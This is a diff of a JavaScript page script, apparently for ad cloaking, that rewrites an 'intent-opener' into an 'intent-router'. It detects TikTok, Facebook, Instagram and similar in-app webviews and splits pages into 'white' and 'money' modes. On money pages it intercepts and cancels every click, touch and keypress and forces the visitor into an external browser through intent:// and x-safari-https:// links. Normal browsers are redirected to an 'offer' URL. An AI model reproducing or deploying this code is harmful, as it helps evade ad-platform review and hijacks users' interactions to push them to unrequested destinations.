@@ -1,156 +1,200 @@
-// main.js
 (function () {
-  // Берём конфиг из глобала
-  const cfg = window.IntentBypassConfig || {};
-  if (!cfg.intentTarget) {
-    console.warn('[intent-opener] no intentTarget configured');
-  }
+  'use strict';
 
-  function log(...args) {
-    if (cfg.debug) console.log('[intent-opener]', ...args);
-  }
+  var cfg   = window.IntentBypassConfig || {};
+  var PAGE  = (cfg.page || '').toLowerCase();
+  var DEBUG = !!cfg.debug;
 
-  function ua() {
-    return navigator.userAgent || navigator.vendor || '';
-  }
-  function isAndroid() {
-    return /Android/i.test(ua());
-  }
-  function isIOS() {
-    return /iPhone|iPad|iPod/i.test(ua());
-  }
-  function isChromeLike() {
-    return /Chrome\/|CriOS\//i.test(ua());
-  }
-
-  // Собираем intent ТАК ЖЕ, как у конкурентов (без encode внутри url)
-  function makeIntentUrl(target) {
-    let t = String(target || '').trim();
-    if (!t) return '';
-    if (!/^https?:\/\//i.test(t)) {
-      t = 'https://' + t.replace(/^\/+/, '');
+  function log() {
+    if (DEBUG && window.console && console.log) {
+      console.log.apply(console, ['[intent-router]'].concat([].slice.call(arguments)));
     }
-
-    // если нужно приклеить текущий query:
-    // const qs = window.location.search || '';
-    // if (qs && !t.includes('?')) t += qs;
-    // else if (qs) t += '&' + qs.slice(1);
-
-    const intentUrl = `intent://navigate?url=${t}#Intent;scheme=googlechrome;end;`;
-    log('built intentUrl:', intentUrl);
-    return intentUrl;
   }
 
-  function makeXSafariUrl(target) {
-    let t = String(target || '').trim();
-    if (!t) return '';
-    t = t.replace(/^https?:\/\//i, '');
-    const url = 'x-safari-https://' + t;
-    log('built x-safari url:', url);
-    return url;
+  function UA() {
+    return (navigator.userAgent || navigator.vendor || '').toLowerCase();
   }
 
-  function beacon(event, extra) {
+  function isAndroid()   { return /android/.test(UA()); }
+  function isIOS()       { return /(iphone|ipad|ipod|ios)/.test(UA()); }
+  function isChromeLike(){ return /(chrome|crios)/.test(UA()); }
+
+  
+  function isInAppWebView() {
+    var u = UA();
+    var hasWV   = u.includes(' wv') || u.includes('; wv)');
+    var isTT    = /tiktok|musical_ly|ttwebview|bytedance|aweme/.test(u);
+    var isFBIG  = /fban|fbav|fb_iab|instagram|igapp|messenger/.test(u);
+    var isOther = /line\/|wechat|snapchat|pinterest/.test(u);
+    return hasWV || isTT || isFBIG || isOther;
+  }
+
+  function normUrl(u) {
+    if (!u) return '';
+    var s = String(u).trim();
+    if (!s) return '';
     try {
-      if (!cfg.beaconEndpoint) return;
-      const payload = Object.assign({
-        event,
-        ts: Date.now(),
-        ua: ua(),
-        intentTarget: cfg.intentTarget
-      }, extra || {});
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(cfg.beaconEndpoint, JSON.stringify(payload));
-      } else {
-        fetch(cfg.beaconEndpoint, {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify(payload)
-        }).catch(() => {});
-      }
-    } catch (e) {}
+      return new URL(s, location.href).href;
+    } catch (_) {
+      return s;
+    }
   }
 
-  // ОДНА попытка открытия внешнего браузера
-  function openExternalOnce(reason) {
-    if (!cfg.intentTarget) {
-      log('no intentTarget, skip openExternalOnce');
+  var OFFER_TARGET = normUrl(cfg.intentTarget) || '';
+  var CLEAN_TARGET = normUrl(cfg.cleanTarget)  || OFFER_TARGET || '';
+
+ 
+
+  function buildChromeIntent(targetUrl, fallbackUrl) {
+    var t = normUrl(targetUrl);
+    if (!t) return '';
+    var f = normUrl(fallbackUrl || targetUrl) || t;
+    // Классический intent формат
+    return 'intent://navigate?url=' + encodeURIComponent(t) +
+           '#Intent;scheme=googlechrome;package=com.android.chrome;' +
+           'S.browser_fallback_url=' + encodeURIComponent(f) + ';end;';
+  }
+
+  function buildXSafari(targetUrl) {
+    var t = normUrl(targetUrl);
+    if (!t) return '';
+    return 'x-safari-https://' + t.replace(/^https?:\/\//i, '');
+  }
+
+  function openExternalViaIntent(targetUrl) {
+    var t = normUrl(targetUrl);
+    if (!t) {
+      log('openExternalViaIntent: empty target, skip');
       return;
     }
 
-    const target = cfg.intentTarget;
-    const clean  = cfg.cleanTarget || cfg.intentTarget;
-    const android = isAndroid();
-    const ios = isIOS();
-    let openUrl = clean;
+    var finalUrl;
 
-    if (android && isChromeLike()) {
-      openUrl = makeIntentUrl(target);
-    } else if (ios) {
-      openUrl = makeXSafariUrl(target);
+    if (isAndroid() && isChromeLike()) {
+      finalUrl = buildChromeIntent(t, t);
+    } else if (isIOS()) {
+      finalUrl = buildXSafari(t);
     } else {
-      openUrl = clean;
+     
+      finalUrl = t;
     }
 
-    if (!openUrl) {
-      log('openUrl empty, skipping');
-      return;
-    }
-
-    beacon('intent_attempt', { reason, openUrl });
+    log('openExternalViaIntent:', finalUrl);
 
     try {
-      log('window.open ->', openUrl);
-      const w = window.open(openUrl, '_blank'); // КЛЮЧЕВОЕ — _blank
-      log('window.open returned:', w);
-    } catch (err) {
-      log('window.open error', err);
+      var w = window.open(finalUrl, '_blank');
+      log('window.open result:', w);
+      
+      if (!w && finalUrl !== t) {
+        location.href = t;
+      }
+    } catch (e) {
+      log('openExternalViaIntent error:', e);
       try {
-        window.location.replace(clean);
+        location.href = t;
       } catch (_) {
-        window.location.href = clean;
+        location.assign(t);
       }
     }
   }
 
-  // === Автоматическая попытка при загрузке (опционально) ===
-  function autoAttempt() {
-    if (!cfg.autoAttemptOnLoad) return;
-    openExternalOnce('auto_on_load');
+  
+  function redirectNormally(targetUrl) {
+    var t = normUrl(targetUrl);
+    if (!t) {
+      log('redirectNormally: empty target, skip');
+      return;
+    }
+    log('redirectNormally ->', t);
+    try {
+      location.href = t;
+    } catch (e) {
+      location.assign(t);
+    }
+  }
+
+  
+
+  function initWhite(inApp) {
+    if (!inApp) {
+     
+      log('WHITE: normal browser, idle.');
+      return;
+    }
+
+    
+    var selfTarget = OFFER_TARGET || CLEAN_TARGET || location.href;
+    log('WHITE: in WebView, auto intent to self:', selfTarget);
+    openExternalViaIntent(selfTarget);
+  }
+
+
+
+  function initMoney(inApp) {
+    var offer = OFFER_TARGET || CLEAN_TARGET;
+
+    if (!offer) {
+      log('MONEY: no offer target configured, idle.');
+      return;
+    }
+
+    if (!inApp) {
+     
+      log('MONEY: normal browser, auto redirect to offer.');
+      redirectNormally(offer);
+      return;
+    }
+
+    
+    log('MONEY: in WebView, bind all actions -> intent(current URL).');
+
+    function handler(ev) {
+      try {
+        ev.preventDefault && ev.preventDefault();
+        ev.stopPropagation && ev.stopPropagation();
+      } catch (_) {}
+      
+      var currentUrl = location.href;
+      log('MONEY WebView event:', ev.type, '-> intent(currentUrl=', currentUrl, ')');
+      openExternalViaIntent(currentUrl);
+    }
+
+    var optsPassiveFalse = { passive: false, capture: true };
+    var optsPassiveTrue  = { passive: true,  capture: true };
+
+    document.addEventListener('click',       handler, optsPassiveTrue);
+    document.addEventListener('pointerdown', handler, optsPassiveTrue);
+    document.addEventListener('touchstart',  handler, optsPassiveFalse);
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter' || e.key === ' ') handler(e);
+    }, true);
+  }
+
+
+  function boot() {
+    var inApp = isInAppWebView();
+    var pageType = (PAGE === 'money') ? 'money' : 'white';
+
+    log('boot:', { pageType: pageType, inApp: inApp, ua: UA() });
+
+    if (pageType === 'money') {
+      initMoney(inApp);
+    } else {
+     
+      initWhite(inApp);
+    }
   }
 
   if (document.readyState === 'complete' || document.readyState === 'interactive') {
-    setTimeout(autoAttempt, 50);
+    boot();
   } else {
-    document.addEventListener('DOMContentLoaded', () => setTimeout(autoAttempt, 50));
+    document.addEventListener('DOMContentLoaded', boot);
   }
 
-  // === Любое действие пользователя → попытка вызова intent ===
-  let lastTs = 0;
-  const DEBOUNCE_MS = 50;
-
-  function onUserInteraction(ev) {
-    const now = Date.now();
-    if (now - lastTs < DEBOUNCE_MS) return;
-    lastTs = now;
-    log('user interaction:', ev.type);
-    openExternalOnce('user_' + ev.type);
-  }
-
-  const events = [
-    'click',
-    'touchstart',
-    'touchend',
-    'pointerdown',
-    'pointerup',
-    'keydown'
-  ];
-
-  events.forEach(evt => {
-    window.addEventListener(evt, onUserInteraction, { passive: true });
-  });
-
-  // Для тестов из консоли
-  window.__intentOpener = { openExternalOnce, cfg };
-  log('intent-opener v_blank init', cfg);
+  // Для дебага в консоли
+  window.__intentRouter = {
+    cfg: cfg,
+    isInAppWebView: isInAppWebView,
+    UA: UA
+  };
 })();
